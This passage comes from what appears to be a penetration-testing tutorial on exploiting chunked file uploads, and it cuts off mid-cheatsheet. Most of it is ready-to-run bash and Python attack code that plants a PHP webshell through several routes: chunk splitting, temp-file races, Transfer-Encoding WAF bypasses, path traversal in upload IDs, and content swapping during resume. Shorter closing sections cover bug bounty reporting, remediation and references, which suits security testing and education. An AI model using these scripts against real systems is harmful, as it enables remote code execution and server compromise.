      "${TARGET}/uploads/tmp/${UPLOAD_ID}_0"
      "${TARGET}/uploads/tmp/shell.php.part0"
      "${TARGET}/uploads/tmp/shell.php_chunk_0"
      "${TARGET}/tmp/${UPLOAD_ID}"
      "${TARGET}/temp/${UPLOAD_ID}"

      # Plupload temp patterns
      "${TARGET}/uploads/shell.php.part"
      "${TARGET}/uploads/shell.php.tmp"
      "${TARGET}/uploads/.shell.php"
      "${TARGET}/uploads/~shell.php"

      # Hash-based temp names
      "${TARGET}/uploads/tmp/$(echo -n "${UPLOAD_ID}" | md5sum | cut -d' ' -f1)"

      # PHP upload temp
      "${TARGET}/uploads/php*"
  )

  for pattern in "${TEMP_PATTERNS[@]}"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$pattern" 2>/dev/null)
      [ "$STATUS" != "404" ] && [ "$STATUS" != "000" ] && echo "[${STATUS}] ${pattern}"
  done

  # ── Step 3: Brute force temp directory listing ──
  curl -s "${TARGET}/uploads/tmp/" | grep -iE "shell|chunk|part|upload|tmp" | head -20
  curl -s "${TARGET}/tmp/" | grep -iE "shell|chunk|part|upload|php" | head -20

  wait $UPLOAD_PID 2>/dev/null
  rm -f /tmp/temp_chunk
  ```
  :::

  :::tabs-item{icon="i-lucide-timer" label="Turbo Intruder Race"}
  ```python [turbo_intruder_race.py]
  # ═══════════════════════════════════════════════
  # Turbo Intruder script for Burp Suite
  # Sends chunk uploads and file access requests simultaneously
  # Paste this in Turbo Intruder (Burp Extension)
  # ═══════════════════════════════════════════════

  # Save as turbo_chunk_race.py and use in Turbo Intruder

  TURBO_SCRIPT = '''
  def queueRequests(target, wordlists):
      engine = RequestEngine(endpoint=target.endpoint,
                             concurrentConnections=30,
                             requestsPerConnection=100,
                             pipeline=False)

      # Upload request (chunk 0 with PHP shell)
      upload_req = """POST /api/upload?chunk=0&chunks=1&name=shell.php HTTP/1.1
  Host: {host}
  Cookie: session=AUTH_TOKEN
  Content-Type: multipart/form-data; boundary=----Bound

  ------Bound
  Content-Disposition: form-data; name="file"; filename="shell.php"
  Content-Type: image/jpeg

  \\xff\\xd8\\xff\\xe0<?php system($_GET["cmd"]); ?>
  ------Bound--"""

      # Access request (try to hit the shell during race window)
      access_req = """GET /uploads/shell.php?cmd=echo+RACE_WON HTTP/1.1
  Host: {host}
  Cookie: session=AUTH_TOKEN

  """

      # Send both rapidly
      for i in range(200):
          engine.queue(upload_req.format(host=target.baseInput.host))
          engine.queue(access_req.format(host=target.baseInput.host))

  def handleResponse(req, interesting):
      if b'RACE_WON' in req.response:
          table.add(req)
  '''

  print("Save this script for Turbo Intruder in Burp Suite")
  print("Steps:")
  print("1. Capture upload request in Burp")
  print("2. Right-click → Extensions → Turbo Intruder → Send to Turbo Intruder")
  print("3. Paste the script above")
  print("4. Click Attack")
  print("5. Check results for 'RACE_WON' in responses")
  ```
  :::
::

### Technique 3 — HTTP Chunked Transfer Encoding Smuggling

::tabs
  :::tabs-item{icon="i-lucide-waypoints" label="Chunked TE WAF Bypass"}
  ```bash
  # ═══════════════════════════════════════════════
  # HTTP Chunked Transfer-Encoding to bypass WAF
  # WAF and application may parse chunked encoding differently
  # ═══════════════════════════════════════════════

  TARGET="https://target.com/api/upload"
  COOKIE="session=TOKEN"

  # ── Method 1: Standard chunked upload ──
  # WAF may not inspect chunked body properly
  printf 'POST /api/upload HTTP/1.1\r\n'\
  'Host: target.com\r\n'\
  'Cookie: session=TOKEN\r\n'\
  'Content-Type: multipart/form-data; boundary=----Boundary\r\n'\
  'Transfer-Encoding: chunked\r\n'\
  '\r\n'\
  '46\r\n'\
  '------Boundary\r\nContent-Disposition: form-data; name="file"; filename="sh\r\n'\
  '3c\r\n'\
  'ell.php"\r\nContent-Type: image/jpeg\r\n\r\n<?php system($_GET[\r\n'\
  '12\r\n'\
  '"cmd"]); ?>\r\n------\r\n'\
  'c\r\n'\
  'Boundary--\r\n\r\n'\
  '0\r\n'\
  '\r\n' | nc target.com 80

  # ── Method 2: Chunked with extension bytes ──
  # RFC allows chunk extensions: size;extension\r\n
  # Some WAFs choke on extensions

  python3 -c "
  import socket
  import ssl

  host = 'target.com'
  port = 443

  # Build chunked request with extensions
  body_part1 = b'------B\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\nContent-Type: image/jpeg\r\n\r\n'
  body_part2 = b'<?php system(\$_GET[\"cmd\"]); ?>\r\n------B--\r\n'

  request = b'POST /api/upload HTTP/1.1\r\n'
  request += b'Host: ' + host.encode() + b'\r\n'
  request += b'Cookie: session=TOKEN\r\n'
  request += b'Content-Type: multipart/form-data; boundary=----B\r\n'
  request += b'Transfer-Encoding: chunked\r\n'
  request += b'\r\n'

  # Chunk 1 with extension (may confuse WAF)
  request += hex(len(body_part1))[2:].encode() + b';ext=val\r\n'
  request += body_part1 + b'\r\n'

  # Chunk 2
  request += hex(len(body_part2))[2:].encode() + b';another=ext\r\n'
  request += body_part2 + b'\r\n'

  # Terminal chunk
  request += b'0\r\n\r\n'

  ctx = ssl.create_default_context()
  ctx.check_hostname = False
  ctx.verify_mode = ssl.CERT_NONE

  sock = socket.socket()
  sock = ctx.wrap_socket(sock, server_hostname=host)
  sock.connect((host, port))
  sock.send(request)
  response = sock.recv(4096)
  print(response.decode(errors='replace'))
  sock.close()
  "

  # ── Method 3: Chunked with 0-size intermediary chunks ──
  # Insert zero-size chunks between data chunks
  # Some parsers handle these differently

  python3 -c "
  import requests

  url = 'https://target.com/api/upload'
  headers = {
      'Cookie': 'session=TOKEN',
      'Content-Type': 'multipart/form-data; boundary=----B',
      'Transfer-Encoding': 'chunked',
  }

  # Build body with zero-size chunks interspersed
  body = b''

  part1 = b'------B\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\nContent-Type: image/jpeg\r\n\r\n'
  body += hex(len(part1))[2:].encode() + b'\r\n' + part1 + b'\r\n'

  # Zero-size chunk (confuses some parsers)
  body += b'0\r\n\r\n'  # This might terminate parsing for WAF

  # But application may continue reading
  part2 = b'<?php system(\$_GET[\"cmd\"]); ?>\r\n------B--\r\n'
  body += hex(len(part2))[2:].encode() + b'\r\n' + part2 + b'\r\n'
  body += b'0\r\n\r\n'

  # Send raw
  import socket, ssl
  ctx = ssl.create_default_context()
  ctx.check_hostname = False
  ctx.verify_mode = ssl.CERT_NONE
  s = socket.socket()
  s = ctx.wrap_socket(s, server_hostname='target.com')
  s.connect(('target.com', 443))

  raw = b'POST /api/upload HTTP/1.1\r\nHost: target.com\r\n'
  for k, v in headers.items():
      raw += k.encode() + b': ' + v.encode() + b'\r\n'
  raw += b'\r\n' + body

  s.send(raw)
  print(s.recv(4096).decode(errors='replace'))
  s.close()
  "
  ```
  :::

  :::tabs-item{icon="i-lucide-waypoints" label="Transfer-Encoding Header Tricks"}
  ```bash
  # ═══════════════════════════════════════════════
  # Transfer-Encoding header manipulation
  # Different servers/WAFs handle TE variations differently
  # ═══════════════════════════════════════════════

  TARGET="https://target.com/api/upload"
  COOKIE="session=TOKEN"

  SHELL='<?php system($_GET["cmd"]); ?>'
  BOUNDARY="----FormBoundary"

  BODY="${BOUNDARY}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\nContent-Type: image/jpeg\r\n\r\n${SHELL}\r\n${BOUNDARY}--\r\n"

  echo "[*] Testing Transfer-Encoding header variations..."

  # Standard
  curl -s -o /dev/null -w "[%{http_code}] Standard chunked\n" \
    -X POST "$TARGET" \
    -H "Cookie: $COOKIE" \
    -H "Content-Type: multipart/form-data; boundary=${BOUNDARY}" \
    -H "Transfer-Encoding: chunked" \
    --data-binary @<(printf '%x\r\n%s\r\n0\r\n\r\n' "${#BODY}" "$BODY")

  # Variations that may confuse WAFs
  for te_header in \
      "Transfer-Encoding: chunked" \
      "Transfer-Encoding:chunked" \
      "Transfer-Encoding: Chunked" \
      "Transfer-Encoding: CHUNKED" \
      "Transfer-Encoding:  chunked" \
      "Transfer-Encoding: chunked " \
      "Transfer-Encoding: \tchunked" \
      "Transfer-encoding: chunked" \
      "transfer-encoding: chunked" \
      "TRANSFER-ENCODING: chunked" \
      "Transfer-Encoding: x]chunked" \
      "Transfer-Encoding: chunked, identity" \
      "Transfer-Encoding: identity, chunked" \
      "Transfer-Encoding: chunked;ext" \
      "X]Transfer-Encoding: chunked"; do

      HEADER_NAME=$(echo "$te_header" | cut -d: -f1)
      HEADER_VALUE=$(echo "$te_header" | cut -d: -f2-)

      STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST "$TARGET" \
        -H "Cookie: $COOKIE" \
        -H "Content-Type: multipart/form-data; boundary=${BOUNDARY}" \
        -H "${HEADER_NAME}:${HEADER_VALUE}" \
        -d "$BODY" 2>/dev/null)

      echo "[${STATUS}] ${te_header}"
  done
  ```
  :::
::

### Technique 4 — Upload Session Manipulation

::tabs
  :::tabs-item{icon="i-lucide-id-card" label="Upload ID Exploitation"}
  ```bash
  # ═══════════════════════════════════════════════
  # Manipulate upload session IDs to:
  # 1. Overwrite other users' uploads
  # 2. Control final filename
  # 3. Write to arbitrary paths
  # 4. Resume someone else's upload with malicious content
  # ═══════════════════════════════════════════════

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"

  SHELL='<?php system($_GET["cmd"]); ?>'

  # ── Test 1: Predictable upload IDs ──
  echo "[*] Testing predictable upload IDs..."

  # Many implementations use sequential IDs, timestamps, or user IDs
  for upload_id in \
      "1" "2" "100" "1000" \
      "$(date +%s)" "$(($(date +%s) - 1))" "$(($(date +%s) + 1))" \
      "user_1" "admin" "test" \
      "$(echo -n 'test' | md5sum | cut -d' ' -f1)" \
      "00000000-0000-0000-0000-000000000001"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST "${UPLOAD_URL}?uploadId=${upload_id}&chunk=0&chunks=1&name=test.txt" \
        -F "file=@-<<<'test'" -H "Cookie: $COOKIE" 2>/dev/null)
      [ "$STATUS" = "200" ] && echo "[+] Upload ID accepted: ${upload_id}"
  done

  # ── Test 2: Upload ID as path (path traversal) ──
  echo ""
  echo "[*] Testing path traversal in upload ID..."

  echo "$SHELL" > /tmp/path_chunk
  for upload_id in \
      "../shell" "../../shell" "../../../shell" \
      "..%2fshell" "..%252fshell" \
      "..\\shell" "..%5cshell" \
      "uploads/../../../var/www/html/shell" \
      "/var/www/html/shell"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST "${UPLOAD_URL}?uploadId=${upload_id}&chunk=0&chunks=1&name=shell.php" \
        -F "file=@/tmp/path_chunk" -H "Cookie: $COOKIE" 2>/dev/null)
      [ "$STATUS" = "200" ] && echo "[+] Path traversal ID accepted: ${upload_id}"
  done

  # ── Test 3: Filename control via upload ID ──
  echo ""
  echo "[*] Testing filename control via upload parameters..."

  for param_combo in \
      "name=shell.php" \
      "filename=shell.php" \
      "file=shell.php" \
      "name=shell.phtml" \
      "name=../shell.php" \
      "name=shell.php%00.jpg" \
      "name=shell.php;.jpg" \
      "path=uploads/shell.php" \
      "dest=shell.php" \
      "target=shell.php"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST "${UPLOAD_URL}?chunk=0&chunks=1&${param_combo}" \
        -F "file=@/tmp/path_chunk;filename=innocent.jpg" -H "Cookie: $COOKIE" 2>/dev/null)
      [ "$STATUS" = "200" ] && echo "[+] Filename control via: ${param_combo}"
  done

  rm -f /tmp/path_chunk
  ```
  :::

  :::tabs-item{icon="i-lucide-id-card" label="Content Swap via Resume"}
  ```python [content_swap_exploit.py]
  #!/usr/bin/env python3
  """
  Content Swap via Resume Attack
  
  Strategy:
  1. Start a legitimate upload (e.g., avatar.jpg)
  2. Upload initial chunks with valid image data
  3. "Resume" the upload but replace remaining chunks with PHP code
  4. Server may not re-validate the already-accepted chunks
  5. Final file is part image, part PHP
  """
  import requests
  import time
  import urllib3
  urllib3.disable_warnings()

  class ContentSwapExploit:
      def __init__(self, upload_url, cookie=None):
          self.upload_url = upload_url
          self.session = requests.Session()
          self.session.verify = False
          if cookie:
              self.session.cookies.update(cookie)

      def exploit_plupload(self, filename='avatar.jpg'):
          """Swap content mid-upload using Plupload protocol"""

          # Legitimate JPEG data for first chunks
          jpeg_data = (
              b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
              + b'\xff\x00' * 500  # Padding with valid-ish JPEG data
          )

          # Malicious PHP for later chunks
          php_code = b'<?php system($_GET["cmd"]); ?>'

          total_chunks = 4

          # Chunks 0-2: Legitimate image data (passes validation)
          for i in range(3):
              chunk = jpeg_data[i*300:(i+1)*300] if i*300 < len(jpeg_data) else b'\x00' * 100
              params = {'chunk': str(i), 'chunks': str(total_chunks), 'name': filename}
              files = {'file': (filename, chunk, 'image/jpeg')}

              r = self.session.post(self.upload_url, params=params, files=files, timeout=15)
              print(f"[*] Chunk {i} (legitimate): [{r.status_code}]")

          time.sleep(1)

          # Chunk 3: Replace with PHP payload
          params = {'chunk': '3', 'chunks': str(total_chunks), 'name': filename}
          files = {'file': (filename, php_code, 'image/jpeg')}

          r = self.session.post(self.upload_url, params=params, files=files, timeout=15)
          print(f"[*] Chunk 3 (malicious PHP): [{r.status_code}]")

          print(f"\n[*] File should now contain JPEG header + PHP code")
          return True

      def exploit_tus_resume(self, filename='avatar.jpg'):
          """Swap content during tus protocol resume"""

          jpeg_data = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
          php_code = b'<?php system($_GET["cmd"]); ?>'
          total_size = len(jpeg_data) + len(php_code)

          # Create upload session
          headers = {
              'Tus-Resumable': '1.0.0',
              'Upload-Length': str(total_size),
              'Upload-Metadata': f'filename {filename},filetype image/jpeg',
          }

          r = self.session.post(self.upload_url, headers=headers, timeout=15)
          upload_url = r.headers.get('Location', self.upload_url + '/temp123')
          print(f"[*] Upload session: {upload_url}")

          # Send legitimate image data
          headers = {
              'Tus-Resumable': '1.0.0',
              'Upload-Offset': '0',
              'Content-Type': 'application/offset+octet-stream',
          }
          r = self.session.patch(upload_url, headers=headers, data=jpeg_data, timeout=15)
          print(f"[*] Sent JPEG header: [{r.status_code}]")

          time.sleep(2)  # Simulate disconnection/pause

          # Resume with PHP code instead of image data
          headers = {
              'Tus-Resumable': '1.0.0',
              'Upload-Offset': str(len(jpeg_data)),
              'Content-Type': 'application/offset+octet-stream',
          }
          r = self.session.patch(upload_url, headers=headers, data=php_code, timeout=15)
          print(f"[*] Sent PHP payload (resume): [{r.status_code}]")

          return True

      def exploit_all(self):
          """Try all content swap methods"""
          print("═══ Content Swap via Resume ═══\n")

          print("--- Plupload Swap ---")
          self.exploit_plupload('shell.php.jpg')

          print("\n--- tus Resume Swap ---")
          self.exploit_tus_resume('shell.phtml')


  if __name__ == "__main__":
      exploit = ContentSwapExploit(
          upload_url="https://target.com/api/upload",
          cookie={"session": "AUTH_TOKEN"},
      )
      exploit.exploit_all()
  ```
  :::
::

### Technique 5 — Chunk Parameter Manipulation

::tabs
  :::tabs-item{icon="i-lucide-settings-2" label="Chunk Index/Count Manipulation"}
  ```bash
  # ═══════════════════════════════════════════════
  # Manipulate chunk metadata parameters
  # ═══════════════════════════════════════════════

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  SHELL='<?php system($_GET["cmd"]); ?>'
  echo "$SHELL" > /tmp/manip_chunk

  echo "═══ Chunk Parameter Manipulation ═══"

  # ── Test 1: Single chunk (bypass multi-chunk validation) ──
  echo "─── Single chunk upload ───"
  curl -s -X POST "${UPLOAD_URL}?chunk=0&chunks=1&name=shell.php" \
    -F "${FIELD}=@/tmp/manip_chunk;filename=shell.php;type=image/jpeg" \
    -H "Cookie: $COOKIE" -w "[%{http_code}]\n"

  # ── Test 2: Declare more chunks than sent ──
  echo "─── Partial upload (declare 10, send 1) ───"
  curl -s -X POST "${UPLOAD_URL}?chunk=0&chunks=10&name=shell.php" \
    -F "${FIELD}=@/tmp/manip_chunk;filename=shell.php" \
    -H "Cookie: $COOKIE" -w "[%{http_code}]\n"
  # The single chunk may be stored as the complete file

  # ── Test 3: Negative chunk index ──
  echo "─── Negative chunk index ───"
  for idx in "-1" "-2" "-100"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST "${UPLOAD_URL}?chunk=${idx}&chunks=1&name=test.php" \
        -F "${FIELD}=@/tmp/manip_chunk" -H "Cookie: $COOKIE" 2>/dev/null)
      echo "[${STATUS}] chunk=${idx}"
  done

  # ── Test 4: Chunk index beyond declared total ──
  echo "─── Out-of-bounds chunk index ───"
  for idx in "5" "99" "999" "9999999"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST "${UPLOAD_URL}?chunk=${idx}&chunks=3&name=test.php" \
        -F "${FIELD}=@/tmp/manip_chunk" -H "Cookie: $COOKIE" 2>/dev/null)
      echo "[${STATUS}] chunk=${idx} (chunks=3)"
  done

  # ── Test 5: Zero total chunks ──
  echo "─── Zero/negative total chunks ───"
  for total in "0" "-1" "99999999" "NaN" "null" "undefined" "true"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST "${UPLOAD_URL}?chunk=0&chunks=${total}&name=test.php" \
        -F "${FIELD}=@/tmp/manip_chunk" -H "Cookie: $COOKIE" 2>/dev/null)
      echo "[${STATUS}] chunks=${total}"
  done

  # ── Test 6: Duplicate chunk index (overwrite) ──
  echo "─── Duplicate chunk index ───"
  # Send chunk 0 with image data (passes validation)
  printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00' > /tmp/valid_chunk
  curl -s -X POST "${UPLOAD_URL}?chunk=0&chunks=1&name=shell.php.jpg" \
    -F "${FIELD}=@/tmp/valid_chunk;type=image/jpeg" \
    -H "Cookie: $COOKIE" -w "  First upload: [%{http_code}]\n"

  # Send chunk 0 AGAIN with PHP code (overwrites previous)
  curl -s -X POST "${UPLOAD_URL}?chunk=0&chunks=1&name=shell.php.jpg" \
    -F "${FIELD}=@/tmp/manip_chunk;type=image/jpeg" \
    -H "Cookie: $COOKIE" -w "  Overwrite: [%{http_code}]\n"

  # ── Test 7: Chunk size parameter manipulation ──
  echo "─── Chunk size parameter ───"
  for size in "0" "1" "100" "999999999" "-1" "NaN"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST "${UPLOAD_URL}?chunk=0&chunks=1&chunkSize=${size}&name=test.php" \
        -F "${FIELD}=@/tmp/manip_chunk" -H "Cookie: $COOKIE" 2>/dev/null)
      echo "[${STATUS}] chunkSize=${size}"
  done

  # ── Test 8: Change filename between chunks ──
  echo "─── Filename change between chunks ───"
  printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00' > /tmp/safe_chunk
  curl -s -X POST "${UPLOAD_URL}?chunk=0&chunks=2&name=safe.jpg" \
    -F "${FIELD}=@/tmp/safe_chunk;filename=safe.jpg;type=image/jpeg" \
    -H "Cookie: $COOKIE" -w "  Chunk 0 (safe.jpg): [%{http_code}]\n"

  # Chunk 1 with different filename
  curl -s -X POST "${UPLOAD_URL}?chunk=1&chunks=2&name=shell.php" \
    -F "${FIELD}=@/tmp/manip_chunk;filename=shell.php;type=image/jpeg" \
    -H "Cookie: $COOKIE" -w "  Chunk 1 (shell.php): [%{http_code}]\n"

  rm -f /tmp/manip_chunk /tmp/valid_chunk /tmp/safe_chunk
  ```
  :::

  :::tabs-item{icon="i-lucide-settings-2" label="Parallel Chunk Upload Race"}
  ```python [parallel_chunk_race.py]
  #!/usr/bin/env python3
  """
  Upload chunks in parallel to exploit race conditions
  in chunk assembly logic. Conflicting simultaneous writes
  may cause undefined behavior.
  """
  import requests
  import threading
  import time
  import urllib3
  urllib3.disable_warnings()

  TARGET = "https://target.com/api/upload"
  COOKIE = {"session": "AUTH_TOKEN"}

  JPEG_HEADER = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
  PHP_SHELL = b'<?php system($_GET["cmd"]); ?>'

  session = requests.Session()
  session.verify = False
  session.cookies.update(COOKIE)

  def upload_chunk(chunk_idx, total, filename, data, label=""):
      """Upload a single chunk"""
      params = {
          'chunk': str(chunk_idx),
          'chunks': str(total),
          'name': filename,
      }
      files = {'file': (filename, data, 'image/jpeg')}
      try:
          r = session.post(TARGET, params=params, files=files, timeout=10)
          print(f"  [{label}] Chunk {chunk_idx}: [{r.status_code}]")
      except Exception as e:
          print(f"  [{label}] Chunk {chunk_idx}: ERROR - {e}")

  print("═══ Parallel Chunk Race Conditions ═══\n")

  # ── Race 1: Simultaneous chunk 0 with different content ──
  print("--- Race 1: Competing chunk 0 uploads ---")
  threads = []
  t1 = threading.Thread(target=upload_chunk, args=(0, 1, "race.php.jpg", JPEG_HEADER + b'\x00' * 100, "SAFE"))
  t2 = threading.Thread(target=upload_chunk, args=(0, 1, "race.php.jpg", JPEG_HEADER + PHP_SHELL, "EVIL"))
  threads.extend([t1, t2])
  for t in threads:
      t.start()
  for t in threads:
      t.join()

  time.sleep(1)

  # ── Race 2: Overlapping multi-chunk uploads ──
  print("\n--- Race 2: Overlapping sessions ---")
  # Session A uploads safe content
  # Session B uploads malicious content to same filename
  # Race determines which gets assembled

  def upload_session(session_label, content_chunks, filename):
      for i, chunk in enumerate(content_chunks):
          upload_chunk(i, len(content_chunks), filename, chunk, session_label)
          time.sleep(0.01)  # Minimal delay

  safe_chunks = [JPEG_HEADER, b'\x00' * 100, b'\xff\xd9']  # Valid JPEG
  evil_chunks = [JPEG_HEADER, PHP_SHELL, b'\xff\xd9']       # JPEG + PHP

  t_safe = threading.Thread(target=upload_session, args=("SAFE", safe_chunks, "overlap.php.jpg"))
  t_evil = threading.Thread(target=upload_session, args=("EVIL", evil_chunks, "overlap.php.jpg"))

  t_safe.start()
  t_evil.start()
  t_safe.join()
  t_evil.join()

  time.sleep(1)

  # ── Race 3: Rapid chunk 0 replacement ──
  print("\n--- Race 3: Rapid chunk 0 replacement ---")
  for i in range(20):
      threading.Thread(
          target=upload_chunk,
          args=(0, 1, "rapid.php.jpg", JPEG_HEADER + PHP_SHELL, f"TRY{i}")
      ).start()

  time.sleep(3)
  print("\n[*] Check target for uploaded files")
  ```
  :::
::

---

## Tool Integration

::tabs
  :::tabs-item{icon="i-lucide-wrench" label="Burp Suite Workflow"}
  ```text
  # ═══ Burp Suite — Chunked Upload Testing ═══

  # 1. PROXY — Upload file through web UI, observe chunk pattern
  #    Look for sequential POSTs with chunk/index parameters

  # 2. REPEATER — Replay individual chunks
  #    a. Modify chunk content (replace image data with PHP)
  #    b. Modify chunk index (negative, out-of-bounds)
  #    c. Modify filename parameter between chunks
  #    d. Modify total chunks count
  #    e. Send duplicate chunk indices

  # 3. INTRUDER — Fuzz chunk parameters
  #    Position 1: chunk index (0-100, negative values)
  #    Position 2: total chunks (0, 1, -1, 999999, NaN)
  #    Position 3: filename (shell.php, shell.phtml, etc.)

  # 4. TURBO INTRUDER — Race condition testing
  #    Upload chunk + access file simultaneously
  #    Use the race condition script provided above

  # 5. MATCH/REPLACE rules for testing:
  #    Request header:
  #      Match: Content-Type: image/jpeg
  #      Replace: Content-Type: application/octet-stream
  #    
  #    Request body:
  #      Match: filename="avatar.jpg"
  #      Replace: filename="avatar.php"

  # 6. Key observations in Proxy History:
  #    - Upload initialization endpoint (returns session ID)
  #    - Individual chunk upload endpoint (with index/count)
  #    - Merge/finalize endpoint (triggers assembly)
  #    - Response headers with upload URLs
  ```
  :::

  :::tabs-item{icon="i-lucide-wrench" label="ffuf Chunk Endpoint Fuzzing"}
  ```bash
  # ── Discover chunk upload endpoints and parameters ──

  # Endpoint discovery
  ffuf -u "https://target.com/FUZZ" \
    -w <(echo -e "upload/chunk\napi/upload/chunk\napi/v1/chunk\nchunk\nupload/init\nupload/start\nupload/complete\nupload/merge\nupload/finalize\ntus/files\nresumable\nplupload") \
    -mc 200,201,204,301,302,401,403,405

  # Parameter fuzzing
  ffuf -u "https://target.com/api/upload?FUZZ=0" \
    -w <(echo -e "chunk\nchunkIndex\nchunk_index\npartNumber\npart\nindex\nchunkNumber\nresumableChunkNumber\nflowChunkNumber\ndzchunkindex\noffset\nseq\nsequence") \
    -mc 200,201,204 -X POST \
    -H "Cookie: session=TOKEN" \
    -d "test"
  ```
  :::
::

---

## Reporting & Remediation

### Bug Bounty Report Guidance

::card-group
  :::card
  ---
  icon: i-lucide-file-text
  title: Report Title Examples
  ---
  - `RCE via Chunked Upload Validation Bypass — Magic Bytes Only Checked on First Chunk`
  - `WAF Bypass via HTTP Chunked Transfer-Encoding in File Upload`
  - `Race Condition in Chunked Upload Assembly Allows Webshell Execution`
  - `Content Swap via Resumable Upload Protocol Enables PHP Execution`
  - `Path Traversal in Chunk Upload Session ID Parameter`
  :::

  :::card
  ---
  icon: i-lucide-alert-triangle
  title: Severity Assessment
  ---
  | Scenario | CVSS | Rating |
  | -------- | ---- | ------ |
  | Chunk split → RCE | 9.8 | Critical |
  | Race condition → RCE | 9.1 | Critical |
  | WAF bypass via chunked TE | 8.6 | High |
  | Content swap → RCE | 9.0 | Critical |
  | Upload ID path traversal | 8.8 | High |
  | Temp file access → RCE | 9.1 | Critical |
  | Parameter manipulation → DoS | 6.5 | Medium |
  :::

  :::card
  ---
  icon: i-lucide-list-checks
  title: Report Structure
  ---
  1. Summary describing the chunked upload mechanism
  2. Which protocol is used (Plupload, Resumable, tus, custom)
  3. The specific validation gap exploited
  4. Step-by-step reproduction with cURL commands
  5. Evidence of code execution (screenshot + command output)
  6. Proof that normal upload is blocked (showing the bypass)
  7. Remediation recommendations
  :::
::

### Remediation Recommendations

::card-group
  :::card
  ---
  icon: i-lucide-shield-check
  title: Validate After Assembly
  ---
  **Never validate only individual chunks.** After all chunks are assembled into the final file, run the complete validation pipeline (extension check, magic bytes, full content analysis, MIME detection) on the reassembled file before making it accessible.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Atomic Assembly + Validation
  ---
  Assemble chunks into a temporary location, validate the complete file, then atomically move to the final location. Never serve the file from the assembly location. Use `rename()` for atomic moves so the file is never in an intermediate state.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Immutable Upload Sessions
  ---
  Lock the filename, extension, and content type at session creation. Do not allow these parameters to change between chunks. Validate each chunk's metadata against the session's original parameters.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Cryptographic Upload IDs
  ---
  Use cryptographically random upload session IDs (UUID v4 or similar). Never use predictable IDs (sequential, timestamp-based, user-derived). Bind upload sessions to the authenticated user.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Clean Temp Files
  ---
  Store chunk temp files in non-executable, non-web-accessible directories. Clean up incomplete uploads after a timeout. Never give temp files executable extensions.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: WAF-Aware Chunked Handling
  ---
  Ensure WAF and application parse `Transfer-Encoding: chunked` identically. Normalize chunked requests before inspection. Reject requests with ambiguous or malformed chunk encoding.
  :::
::

---

## References & Resources

::card-group
  :::card
  ---
  icon: i-lucide-external-link
  title: OWASP — Unrestricted File Upload
  to: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
  target: _blank
  ---
  OWASP guide covering file upload vulnerabilities including chunked upload considerations and defense strategies.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: tus — Resumable Upload Protocol
  to: https://tus.io/protocols/resumable-upload
  target: _blank
  ---
  Official tus protocol specification — understanding this protocol is essential for testing resumable upload implementations.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: PortSwigger — HTTP Request Smuggling
  to: https://portswigger.net/web-security/request-smuggling
  target: _blank
  ---
  Research on Transfer-Encoding desynchronization attacks that apply to chunked file upload WAF bypass scenarios.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: Plupload Documentation
  to: https://www.plupload.com/docs/v2/
  target: _blank
  ---
  Documentation for Plupload — one of the most common JavaScript chunked upload libraries found in web applications.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: HackTricks — File Upload
  to: https://book.hacktricks.wiki/en/pentesting-web/file-upload/
  target: _blank
  ---
  Practical exploitation guide covering chunked upload abuse, race conditions, and upload mechanism manipulation.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: PortSwigger — Race Conditions
  to: https://portswigger.net/web-security/race-conditions
  target: _blank
  ---
  Research on web application race conditions including file upload race windows between assembly and validation.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: CWE-434 — Unrestricted Upload of Dangerous File
  to: https://cwe.mitre.org/data/definitions/434.html
  target: _blank
  ---
  MITRE CWE entry covering dangerous file upload including chunked upload validation bypass scenarios.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: CWE-444 — HTTP Request/Response Smuggling
  to: https://cwe.mitre.org/data/definitions/444.html
  target: _blank
  ---
  CWE covering request smuggling via Transfer-Encoding inconsistencies applicable to chunked upload WAF bypasses.
  :::
::

---

## Quick Reference Cheatsheet

::field-group
  :::field{name="Split payload (magic + shell)" type="command"}
  `printf '\xFF\xD8\xFF\xE0' > c0.bin && echo -n '<?php system($_GET["cmd"]); ?>' > c1.bin`
  :::

  :::field{name="Upload chunk 0 (Plupload)" type="command"}
  `curl -X POST 'URL?chunk=0&chunks=2&name=shell.php.jpg' -F 'file=@c0.bin' -H 'Cookie: session=TOKEN'`
  :::

  :::field{name="Upload chunk 1 (Plupload)" type="command"}
  `curl -X POST 'URL?chunk=1&chunks=2&name=shell.php.jpg' -F 'file=@c1.bin' -H 'Cookie: session=TOKEN'`
  :::

  :::field{name="Resumable.js chunk" type="command"}
